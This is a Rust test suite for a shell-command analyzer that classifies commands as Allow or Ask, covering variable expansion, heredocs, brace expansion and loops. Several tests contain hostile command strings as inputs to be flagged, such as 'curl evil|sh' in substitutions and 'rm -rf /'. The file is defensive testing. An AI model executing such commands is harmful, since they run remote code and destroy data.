use super::*;
use crate::resolve::tests::MockLookup;
use crate::verdict::Decision;

fn make_analyzer() -> Analyzer {
    make_analyzer_with(MockLookup::new())
}

fn make_analyzer_with(lookup: MockLookup) -> Analyzer {
    Analyzer::new_with_var_lookup(
        Config::empty(),
        false,
        PathBuf::from("/project"),
        false,
        Box::new(lookup),
    )
    .unwrap()
}

#[test]
fn command_substitution_floor_is_ask() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $(ls)").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn or_harmless_fallback_with_redirect_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("ls || echo fail > log.txt").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn param_expansion_in_safe_command_resolves_to_value() {
    let mut a = make_analyzer_with(MockLookup::new().with("HOME", "/Users/test"));
    let v = a.analyze("echo ${HOME}").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert_eq!(v.resolved_command.as_deref(), Some("echo /Users/test"));
    assert!(v.reason.contains("(resolved: echo /Users/test)"));
}

#[test]
fn simple_var_in_safe_command_resolves_to_value() {
    let mut a = make_analyzer_with(MockLookup::new().with("HOME", "/Users/test"));
    let v = a.analyze("echo $HOME").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert_eq!(v.resolved_command.as_deref(), Some("echo /Users/test"));
}

#[test]
fn ansi_c_in_safe_command_resolves_to_literal() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $'\\x41'").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert_eq!(v.resolved_command.as_deref(), Some("echo A"));
}

#[test]
fn locale_string_in_safe_command_resolves_to_literal() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $\"hello\"").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert_eq!(v.resolved_command.as_deref(), Some("echo hello"));
}

#[test]
fn arithmetic_expansion_in_safe_command_resolves_to_literal() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $((1+1))").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert_eq!(v.resolved_command.as_deref(), Some("echo 2"));
}

#[test]
fn brace_expansion_in_safe_command_resolves_to_literal() {
    let mut a = make_analyzer();
    let v = a.analyze("echo {a,b,c}").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert_eq!(v.resolved_command.as_deref(), Some("echo a b c"));
}

#[test]
fn heredoc_with_param_expansion_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("cat <<EOF\n${HOME}\nEOF").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn heredoc_quoted_with_param_expansion_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("cat <<'EOF'\n${HOME}\nEOF").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn heredoc_bare_var_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("cat <<EOF\n$HOME\nEOF").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn safe_command_without_expansion_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("echo hello").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert!(v.resolved_command.is_none());
}

#[test]
fn param_length_in_safe_command_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo ${#var}").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn param_indirect_in_safe_command_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo ${!ref}").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn unset_var_asks_with_diagnostic_reason() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $UNSET").unwrap();
    assert_eq!(v.decision, Decision::Ask);
    assert!(
        v.reason.contains("$UNSET is not set"),
        "expected diagnostic about unset var, got: {}",
        v.reason
    );
}

#[test]
fn command_substitution_still_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $(whoami)").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn arithmetic_division_by_zero_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $((1/0))").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn rm_with_resolved_arg_still_asks_via_handler() {
    let mut a = make_analyzer_with(MockLookup::new().with("TARGET", "/tmp/file"));
    let v = a.analyze("rm $TARGET").unwrap();
    assert_eq!(v.decision, Decision::Ask);
    assert_eq!(v.resolved_command.as_deref(), Some("rm /tmp/file"));
}

#[test]
fn dynamic_command_position_asks_even_when_resolved() {
    let mut a = make_analyzer_with(MockLookup::new().with("cmd", "ls"));
    let v = a.analyze("$cmd args").unwrap();
    assert_eq!(v.decision, Decision::Ask);
    assert!(
        v.reason.contains("dynamic command"),
        "expected dynamic-command reason, got: {}",
        v.reason
    );
    assert_eq!(v.resolved_command.as_deref(), Some("ls args"));
}

#[test]
fn handler_path_resolves_quoted_subcommand() {
    let mut a = make_analyzer();
    let v = a.analyze("git $'status'").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert_eq!(v.resolved_command.as_deref(), Some("git status"));
}

#[test]
fn param_default_resolves_when_unset() {
    let mut a = make_analyzer();
    let v = a.analyze("echo ${UNSET:-default}").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert_eq!(v.resolved_command.as_deref(), Some("echo default"));
}

#[test]
fn var_value_with_command_substitution_stays_literal() {
    let mut a = make_analyzer_with(MockLookup::new().with("CMD_STR", "$(whoami)"));
    let v = a.analyze("echo $CMD_STR").unwrap();
    assert_eq!(
        v.decision,
        Decision::Allow,
        "echo with literal-looking command sub should allow, got: {v:?}"
    );
    assert_eq!(v.resolved_command.as_deref(), Some("echo '$(whoami)'"));
}

#[test]
fn var_value_with_dangerous_command_string_still_safe_for_echo() {
    let mut a = make_analyzer_with(MockLookup::new().with("CMD_STR", "rm -rf /"));
    let v = a.analyze("echo $CMD_STR").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert_eq!(v.resolved_command.as_deref(), Some("echo 'rm -rf /'"));
}

#[test]
fn var_value_with_backticks_stays_literal() {
    let mut a = make_analyzer_with(MockLookup::new().with("X", "`whoami`"));
    let v = a.analyze("echo $X").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert_eq!(v.resolved_command.as_deref(), Some("echo '`whoami`'"));
}

#[test]
fn huge_brace_expansion_falls_back_to_ask() {
    let mut a = make_analyzer();
    let v = a.analyze("echo {1..100000}").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn cartesian_brace_explosion_falls_back_to_ask() {
    let mut a = make_analyzer();
    let v = a.analyze("echo {1..32}{1..32}{1..32}").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn safe_heredoc_in_command_substitution_allows() {
    let mut a = make_analyzer();
    let v = a
        .analyze("echo \"$(cat <<'EOF'\nhello world\nEOF\n)\"")
        .unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn unquoted_heredoc_in_command_substitution_asks() {
    let mut a = make_analyzer();
    let v = a
        .analyze("echo \"$(cat <<EOF\n$(rm -rf /)\nEOF\n)\"")
        .unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn unsafe_command_heredoc_in_substitution_asks() {
    let mut a = make_analyzer();
    let v = a
        .analyze("echo \"$(bash <<'EOF'\nrm -rf /\nEOF\n)\"")
        .unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn pipeline_in_heredoc_substitution_asks() {
    let mut a = make_analyzer();
    let v = a
        .analyze("echo \"$(cat <<'EOF' | bash\nhello\nEOF\n)\"")
        .unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn heredoc_substitution_in_git_commit_resolves() {
    let mut a = make_analyzer();
    let v = a
        .analyze("git commit -m \"$(cat <<'EOF'\nmy commit message\nEOF\n)\"")
        .unwrap();
    assert_eq!(v.decision, Decision::Ask);
    assert!(
        v.resolved_command.is_some(),
        "heredoc substitution should resolve to a concrete command"
    );
}

#[test]
fn command_sub_without_heredoc_still_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $(ls)").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn bare_assignment_with_cmdsub_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("x=$(rm -rf /)").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn assignment_prefix_with_cmdsub_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("FOO=$(whoami) ls").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn assignment_with_backtick_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("FOO=`rm -rf /` ls").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn assignment_prefix_with_cmdsub_in_list_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("true && FOO=$(rm -rf /) ls").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn literal_assignment_prefix_still_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("CI=bar ls").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

fn make_analyzer_with_config(toml: &str) -> Analyzer {
    use crate::config::ConfigFormat;
    let config = Config::load_from_str(toml, ConfigFormat::Toml).unwrap();
    Analyzer::new_with_var_lookup(
        config,
        false,
        PathBuf::from("/tmp"),
        false,
        Box::new(MockLookup::new()),
    )
    .unwrap()
}

const FOO_ALLOW_TOML: &str = "[[rules]]\naction = \"allow\"\ncommand = \"foo\"\n";

#[test]
fn env_prefix_matches_command_rule() {
    let mut a = make_analyzer_with_config(FOO_ALLOW_TOML);
    let v = a.analyze("LANG=x foo").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn multi_assignment_prefix_stripped() {
    let mut a = make_analyzer_with_config(FOO_ALLOW_TOML);
    let v = a.analyze("CI=1 DEBUG=2 foo").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn env_prefix_with_cmdsub_not_stripped_still_asks() {
    let mut a = make_analyzer_with_config(FOO_ALLOW_TOML);
    let v = a.analyze("FOO=$(rm -rf /) foo").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn variable_value_containing_dollar_is_not_re_expanded() {
    let mut a = make_analyzer_with(MockLookup::new().with("A", "$B").with("B", "actual"));
    let v = a.analyze("echo $A").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert_eq!(v.resolved_command.as_deref(), Some("echo '$B'"));
}

#[test]
fn for_loop_echo_var_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("for i in 1 2 3; do echo $i; done").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn for_loop_glob_wc_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("for f in *.rs; do wc -l $f; done").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn for_loop_rm_still_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("for f in *.rs; do rm -rf $f; done").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn for_loop_dynamic_arg_handler_asks() {
    let mut a = make_analyzer();
    let v = a
        .analyze("for f in *.rs; do git checkout $f; done")
        .unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn for_loop_iteration_words_substitution_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("for f in $(curl x); do echo $f; done").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn literal_prior_assignment_binds() {
    let mut a = make_analyzer();
    let v = a.analyze("TZ=/tmp/x; ls $TZ").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert_eq!(v.resolved_command.as_deref(), Some("ls /tmp/x"));
}

#[test]
fn env_prefix_same_command_binds() {
    let mut a = make_analyzer();
    let v = a.analyze("TZ=/tmp ls $TZ").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn dynamic_command_substitution_assignment_still_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("x=$(ls); echo $x").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn status_var_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $?").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn pipestatus_subscript_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("echo ${PIPESTATUS[0]}").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn command_position_dynamic_loop_var_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("for c in ls; do $c; done").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn local_binding_does_not_leak() {
    let mut a = make_analyzer();
    let v = a
        .analyze("for i in 1 2 3; do echo $i; done; echo $i")
        .unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn env_prefix_binding_does_not_leak_to_sibling() {
    let mut a = make_analyzer();
    let v = a.analyze("DIR=/tmp ls $DIR; ls $DIR").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn dynamic_arg_before_command_substitution_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $? $(rm -rf /)").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn dynamic_arg_before_process_substitution_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("cat $? <(curl evil|sh)").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn dynamic_arg_before_backtick_substitution_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("echo $? `rm -rf /`").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn loop_var_before_substitution_in_body_asks() {
    let mut a = make_analyzer();
    let v = a
        .analyze("for f in a; do cat $f $(curl evil|sh); done")
        .unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn dynamic_arg_only_still_allows_safe_command() {
    let mut a = make_analyzer();
    let v = a.analyze("for f in a b; do cat $f; done").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn dynamic_arg_mount_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("for m in a b; do mount $m; done").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn dynamic_arg_pager_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("for f in *.txt; do less $f; done").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn dynamic_arg_fzf_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("for f in *.txt; do fzf $f; done").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn select_loop_echo_var_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("select x in a b; do echo $x; done").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}

#[test]
fn select_loop_handler_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("select f in *.rs; do rm -rf $f; done").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn select_loop_iteration_words_substitution_asks() {
    let mut a = make_analyzer();
    let v = a
        .analyze("select f in $(curl evil|sh); do echo $f; done")
        .unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn append_assignment_shadows_prior_literal_not_a_stale_value() {
    let mut a = make_analyzer();
    let v = a.analyze("DEBUG=/safe DEBUG+=/more cat $DEBUG").unwrap();
    assert_eq!(v.decision, Decision::Allow);
    assert!(v.resolved_command.is_none());
    assert!(v.reason.contains("dynamic arg"), "reason: {}", v.reason);
}

#[test]
fn append_assignment_handler_still_asks() {
    let mut a = make_analyzer();
    let v = a.analyze("A=/tmp A+=/x rm -rf $A").unwrap();
    assert_eq!(v.decision, Decision::Ask);
}

#[test]
fn append_assignment_env_prefix_safe_command_allows() {
    let mut a = make_analyzer();
    let v = a.analyze("DEBUG+=/more ls $DEBUG").unwrap();
    assert_eq!(v.decision, Decision::Allow);
}
